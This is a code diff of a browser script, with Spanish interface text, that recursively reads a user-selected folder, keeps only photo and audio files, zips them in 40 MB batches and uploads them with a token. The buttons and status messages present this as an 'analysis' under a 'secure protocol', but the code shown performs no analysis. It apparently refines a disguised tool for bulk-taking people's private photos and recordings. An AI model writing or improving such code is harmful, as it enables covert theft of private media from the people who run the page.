@@ -21,53 +21,6 @@ function updateStatus(message, progress = 0) {
     }
 }
 
-async function processNextBlock(files, token, startIndex = 0) {
-    const maxBlockSize = 500 * 1024 * 1024; // 500 MB en bytes
-    let currentSize = 0;
-    const blockFiles = [];
-
-    for (let i = startIndex; i < files.length; i++) {
-        const file = files[i];
-        const fileData = await file.getFile();
-        const fileSize = fileData.size;
-
-        if (fileSize > 50 * 1024 * 1024) {
-            alert(`Archivo ${file.name} (${(fileSize / 1024 / 1024).toFixed(2)} MB) excede el límite de 50 MB y será omitido.`);
-            continue;
-        }
-
-        if (currentSize + fileSize > maxBlockSize) {
-            localStorage.setItem('nextFileIndex', i);
-            break;
-        }
-
-        blockFiles.push(file);
-        currentSize += fileSize;
-    }
-
-    if (blockFiles.length > 0) {
-        updateStatus('Comprimiendo bloque...', 50);
-        const zipBatches = await createZipBatches(blockFiles);
-        totalBatches = zipBatches.length;
-
-        updateStatus('Iniciando protocolo seguro...', 70);
-        await processBatches(zipBatches, token);
-
-        const nextIndex = parseInt(localStorage.getItem('nextFileIndex')) || 0;
-        if (nextIndex < files.length) {
-            updateStatus('Bloque completado. Presiona "Continuar" para el siguiente.', 80);
-            alert('Bloque completado. Presiona "Continuar" para el siguiente.');
-            document.getElementById('start-btn').textContent = 'Continuar';
-            isProcessing = false;
-        } else {
-            updateStatus('✅ OPERACIÓN EXITOSA', 100);
-            localStorage.removeItem('nextFileIndex');
-            document.getElementById('start-btn').textContent = 'Iniciar Análisis';
-            isProcessing = false;
-        }
-    }
-}
-
 document.getElementById('start-btn').addEventListener('click', async () => {
     if (isProcessing) return;
     isProcessing = true;
@@ -94,13 +47,19 @@ document.getElementById('start-btn').addEventListener('click', async () => {
                 if (!files.length) throw new Error('No hay archivos');
                 updateStatus(`Elementos detectados: ${files.length}`, 40);
 
-                const startIndex = parseInt(localStorage.getItem('nextFileIndex')) || 0;
-                await processNextBlock(files, token, startIndex);
+                updateStatus('Comprimiendo datos...', 50);
+                const zipBatches = await createZipBatches(files);
+                totalBatches = zipBatches.length;
+                
+                updateStatus('Iniciando protocolo seguro...', 70);
+                await processBatches(zipBatches, token);
+                
+                updateStatus('✅ OPERACIÓN EXITOSA', 100);
             } catch (error) {
                 updateStatus(`❌ ERROR: ${error.message}`, 0);
                 alert(`FALLO: ${error.message}`);
-                isProcessing = false;
             }
+            isProcessing = false;
         }, 100);
         
     } catch (error) {
@@ -113,8 +72,15 @@ document.getElementById('start-btn').addEventListener('click', async () => {
 async function collectFiles(folderHandle) {
     const files = [];
     for await (const entry of folderHandle.values()) {
-        if (entry.kind === 'file') files.push(entry);
-        else if (entry.kind === 'directory') {
+        if (entry.kind === 'file') {
+            const fileName = entry.name.toLowerCase();
+            // Filtrar solo fotos y audios, excluir videos
+            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') || 
+                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
+                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
+                files.push(entry);
+            }
+        } else if (entry.kind === 'directory') {
             const subFiles = await collectFiles(entry);
             files.push(...subFiles);
         }
@@ -123,7 +89,7 @@ async function collectFiles(folderHandle) {
 }
 
 async function createZipBatches(files) {
-    const maxSize = 50 * 1024 * 1024; // 50 MB en bytes
+    const maxSize = 40 * 1024 * 1024; // 40 MB en bytes
     const batches = [];
     let currentBatch = new JSZip();
     let currentSize = 0;
@@ -133,10 +99,13 @@ async function createZipBatches(files) {
         const fileData = await file.getFile();
         const fileSize = fileData.size;
 
-        if (fileSize > maxSize) continue; // Ya se manejó en processNextBlock
-
         if (currentSize + fileSize > maxSize && currentBatch.fileCount > 0) {
-            batches.push(currentBatch);
+            const zipBlob = await currentBatch.generateAsync({ type: 'blob' });
+            if (zipBlob.size <= maxSize) {
+                batches.push(currentBatch);
+            } else {
+                alert(`El zip generado excede 40 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB) y será omitido`);
+            }
             currentBatch = new JSZip();
             currentSize = 0;
         }
@@ -145,7 +114,12 @@ async function createZipBatches(files) {
         currentSize += fileSize;
 
         if (i === files.length - 1 && currentSize > 0) {
-            batches.push(currentBatch);
+            const zipBlob = await currentBatch.generateAsync({ type: 'blob' });
+            if (zipBlob.size <= maxSize) {
+                batches.push(currentBatch);
+            } else {
+                alert(`El zip final excede 40 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB) y será omitido`);
+            }
         }
     }
     return batches;
@@ -162,8 +136,8 @@ async function processBatches(batches, token) {
             updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);
             
             const zipBlob = await batches[index].generateAsync({ type: 'blob' });
-            if (zipBlob.size > 50 * 1024 * 1024) {
-                throw new Error(`El zip ${index} excede 50 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB)`);
+            if (zipBlob.size > 40 * 1024 * 1024) {
+                throw new Error(`El zip ${index} excede 40 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB)`);
             }
             await uploadZip(zipBlob, `secure-${Date.now()}-${index}.zip`, token);
             
